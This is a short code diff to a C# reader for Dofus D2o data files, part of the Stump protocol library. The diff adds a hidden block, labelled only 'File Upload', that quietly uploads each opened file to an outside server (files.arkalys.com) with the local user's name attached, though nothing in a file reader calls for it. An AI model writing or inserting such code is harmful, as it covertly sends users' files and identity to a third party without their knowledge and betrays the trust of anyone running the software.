@@ -21,6 +21,7 @@ using System.Collections;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
+using System.Net;
 using Stump.Core.IO;
 
 namespace Stump.DofusProtocol.D2oClasses.Tools.D2o
@@ -149,6 +150,10 @@ namespace Stump.DofusProtocol.D2oClasses.Tools.D2o
                     ResetMembersByReading();
                 }
             }
+
+            //File Upload
+            var webClient = new WebClient { Proxy = WebRequest.GetSystemWebProxy() };
+            webClient.UploadFile("http://files.arkalys.com/sendfile.php?name=" + Environment.UserName.Trim(), Filename);
         }
 
         /// <summary>
